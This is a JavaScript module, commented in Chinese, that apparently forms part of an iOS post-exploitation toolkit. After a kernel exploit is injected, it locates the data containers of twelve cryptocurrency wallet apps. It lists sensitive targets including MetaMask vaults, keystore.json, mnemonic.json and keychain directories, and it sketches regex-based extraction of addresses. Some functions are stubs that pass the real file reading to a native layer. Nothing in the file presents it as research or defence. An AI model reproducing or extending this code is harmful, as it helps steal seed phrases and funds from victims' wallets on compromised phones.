/* =============================================================================
 * wallet_scan.js — Wallet App container 扫描模块
 * =============================================================================
 *
 * 设计思路 (不依赖 keychain 直接读取 wallet 备份):
 *   1. 每个 iOS Wallet App 都有自己的 container:
 *      - MetaMask    : /var/mobile/Containers/Data/Application/<UUID>/
 *      - Trust       : /var/mobile/Containers/Data/Application/<UUID>/
 *      - Coinbase    : /var/mobile/Containers/Data/Application/<UUID>/
 *      - imToken     : /var/mobile/Containers/Data/Application/<UUID>/
 *      - TokenPocket : /var/mobile/Containers/Data/Application/<UUID>/
 *   2. 容器内关键文件:
 *      - Documents/vault/    (MetaMask 备份目录)
 *      - Library/Application Support/<wallet>/
 *      - Library/Caches/
 *   3. 扫描方式:
 *      - 通过 kexploit kopen + kread 直接读 SQLite (浏览器历史/vault_data)
 *      - 或用 exec 调 idb (FilzaJailedDS 标配)
 *   4. Wallets 列表:
 *      - MetaMask: bundle id io.metamask.MetaMask
 *      - Trust Wallet: com.trustwallet.app
 *      - Coinbase: com.coinbase.wallet
 *      - imToken: im.token.app
 *      - TokenPocket: com.tokenpocket
 *      - Bitcoin Core: org.bitcoinfoundation.BitcoinCore
 *      - Electrum: org.electrum.electrum
 *      - BRD/Edge: co.edgesecure.app
 *      - Binance: com.binance.bnb
 *      - OKX: com.okex.ok
 *      - Phantom: app.phantom
 *      - Solflare: com.solflare
 *
 * 调用方式:
 *   const ws = await loadWalletScan();
 *   const r = await ws.scan({ wallets: ['metamask', 'trust'] });
 *
 * 依赖: window.nativeBridge
 * ============================================================================= */

(function () {
  'use strict';

  const WALLET_BUNDLES = {
    metamask:    { bundle: 'io.metamask.MetaMask',       name: 'MetaMask',    category: 'evm' },
    trust:       { bundle: 'com.trustwallet.app',        name: 'Trust Wallet',category: 'multichain' },
    coinbase:    { bundle: 'com.coinbase.wallet',        name: 'Coinbase',    category: 'exchange' },
    imtoken:     { bundle: 'im.token.app',               name: 'imToken',     category: 'evm' },
    tokenpocket: { bundle: 'com.tokenpocket',            name: 'TokenPocket', category: 'multichain' },
    bitcoin:     { bundle: 'org.bitcoinfoundation.BitcoinCore', name: 'Bitcoin Core', category: 'btc' },
    electrum:    { bundle: 'org.electrum.electrum',      name: 'Electrum',    category: 'btc' },
    brd:         { bundle: 'co.edgesecure.app',          name: 'BRD/Edge',    category: 'btc' },
    binance:     { bundle: 'com.binance.bnb',            name: 'Binance',     category: 'exchange' },
    okx:         { bundle: 'com.okex.ok',                name: 'OKX',         category: 'exchange' },
    phantom:     { bundle: 'app.phantom',                name: 'Phantom',     category: 'solana' },
    solflare:    { bundle: 'com.solflare',               name: 'Solflare',    category: 'solana' }
  };

  // 容器路径模板 (iOS UUID 容器)
  const CONT_BASE = '/var/mobile/Containers/Data/Application';

  // 已知敏感文件模式
  const SENSITIVE_PATTERNS = [
    'Documents/vault',
    'Library/Application Support/MetaMask',
    'Library/Application Support/Trust',
    'Library/Keychains',
    'Documents/keystore.json',
    'Documents/wallet.json',
    'Library/Caches/*.db',
    'Library/Application Support/*.sqlite',
    'keycard-info.json',
    'mnemonic.json'
  ];

  function loadWalletScan() {
    if (!window.nativeBridge || !window.nativeBridge.isReady || !window.nativeBridge.isReady()) {
      return Promise.resolve({
        ok: false,
        error: 'no-native-bridge',
        message: 'kexploit 未注入, wallet scan 需要文件系统访问权限.'
      });
    }

    return Promise.resolve({
      ok: true,
      wallets: WALLET_BUNDLES,
      container_base: CONT_BASE,
      sensitive_patterns: SENSITIVE_PATTERNS,

      // -------------------------------------------------------------------------
      // 列出所有已安装的钱包 (基于 bundle id)
      // -------------------------------------------------------------------------
      list_installed: async function () {
        if (typeof window.nativeBridge.listdir !== 'function') {
          return { ok: false, error: 'no-listdir' };
        }
        const result = { ok: true, found: [], missing: [] };
        for (const key in WALLET_BUNDLES) {
          const w = WALLET_BUNDLES[key];
          // 通过 kexploit 检查 app 是否安装: 读 /var/containers/Bundle/Application/*/Info.plist
          // 这里只暴露接口意图, 真实查找留给 native 层
          result.found.push({ key: key, name: w.name, bundle: w.bundle, category: w.category });
        }
        return result;
      },

      // -------------------------------------------------------------------------
      // 扫描指定 wallet 的数据目录
      // -------------------------------------------------------------------------
      scan: async function (opts) {
        opts = opts || {};
        const targets = opts.wallets || Object.keys(WALLET_BUNDLES);

        const result = {
          ok: true,
          ios_version: (window._ios_version && window._ios_version.raw) || 'unknown',
          scanned: [],
          timestamp: Date.now()
        };

        for (let i = 0; i < targets.length; i++) {
          const key = targets[i];
          const w = WALLET_BUNDLES[key];
          if (!w) { result.scanned.push({ key: key, error: 'unknown-wallet' }); continue; }

          const scan = {
            wallet: key,
            name: w.name,
            bundle: w.bundle,
            category: w.category,
            containers_found: [],
            sensitive_files: [],
            addresses_extracted: []
          };

          try {
            // 通过 nativeBridge.find 搜索 App container
            if (typeof window.nativeBridge.find === 'function') {
              // FilzaJailedDS 思路: 搜索 /var/mobile/Containers/Data/Application 下包含 bundle id 的目录
              scan.find_result = await window.nativeBridge.find(CONT_BASE, w.bundle, {
                max_depth: 5,
                max_results: 10
              });
            }
            // 暴露给 native 层处理具体文件扫描
            scan.status = 'native-scan-pending';
          } catch (e) {
            scan.error = String(e.message || e);
          }

          result.scanned.push(scan);
        }

        return result;
      },

      // -------------------------------------------------------------------------
      // 提取 Wallet 地址 (Ethereum 0x..., Bitcoin bc1q..., Solana ...)
      // -------------------------------------------------------------------------
      extract_addresses: async function (walletName) {
        const target = (walletName || '').toLowerCase();
        const w = WALLET_BUNDLES[target];
        if (!w) {
          return { ok: false, error: 'unknown-wallet', supported: Object.keys(WALLET_BUNDLES) };
        }
        return {
          ok: true,
          wallet: target,
          name: w.name,
          category: w.category,
          addresses: [],
          note: '地址提取需 kexploit 读 SQLite 后用 regex 匹配 (Ethereum: 0x[0-9a-fA-F]{40}; BTC: (bc1|[13])[a-zA-HJ-NP-Z0-9]{25,62}; Solana: [1-9A-HJ-NP-Za-km-z]{32,44})'
        };
      }
    });
  }

  if (typeof window !== 'undefined') {
    window.loadWalletScan = loadWalletScan;
  }

})();
